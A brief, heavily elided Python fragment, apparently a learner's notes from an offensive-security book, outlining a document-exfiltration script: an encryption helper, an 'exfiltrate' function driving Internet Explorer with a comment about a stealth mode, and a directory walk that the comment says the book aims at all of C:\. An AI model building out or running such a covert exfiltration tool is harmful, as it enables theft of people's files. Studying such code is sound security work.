...
def encrypt_string(plaintext):
    ...
    print(f"Based64 encoded crypto:{len(encrypted)}")
    return encrypted
...
def exfiltrate(document_path):
    ...
    ie.Visable = 1 # set to 0 for stealth mode
...
# the book here use "for parent, directories, filename in os,walk("C:\\"):"
for parent, directories, filenames in os.walk("C:\\Users\\user\\Download\\test"):
